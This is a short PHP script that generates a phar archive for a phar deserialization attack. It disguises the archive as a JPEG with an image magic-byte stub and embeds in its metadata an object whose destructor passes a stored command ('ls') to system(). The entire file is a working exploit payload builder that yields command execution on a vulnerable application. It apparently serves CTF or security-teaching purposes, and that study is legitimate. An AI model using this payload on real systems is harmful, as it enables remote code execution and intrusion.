<?php
class Anyclass{
    public $data = null;
    public function __construct($data){
        $this->data = $data;
    }
    function __destruct(){
        system($this->data);
    }
}
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

$object = new Anyclass('ls');
$phar->setMetadata($object);
$phar->stopBuffering();

?>